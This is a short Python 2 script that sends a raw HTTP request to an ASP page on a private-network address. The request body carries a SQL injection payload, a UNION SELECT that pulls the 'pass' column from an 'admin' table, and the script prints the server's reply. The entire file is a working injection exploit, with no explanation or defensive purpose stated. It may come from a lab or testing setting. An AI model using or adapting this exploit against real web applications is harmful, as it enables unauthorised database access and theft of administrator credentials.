#!/usr/bin/env python

import socket

host = '192.168.28.129'
path = '/3.asp'
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.settimeout(8)

exploit_packet="id=1%20union%20select%201%2Cpass%2C3%20from%20admin"
exploit_packet+="\r\n" * 8
packet_length = len(exploit_packet)
packet='GET ' + path + ' HTTP/1.1\r\n'
packet+='Host: ' + host + '\r\n'
packet+='Content-Length: %s\r\n' % packet_length
packet+='Content-Type: application/x-www-form-urlencoded\r\n'
packet+='\r\n'
packet = packet + exploit_packet

print packet
s.send(packet)
buf = s.recv(1000)
if buf: print buf[buf.rfind("\r\n"):]
s.close()
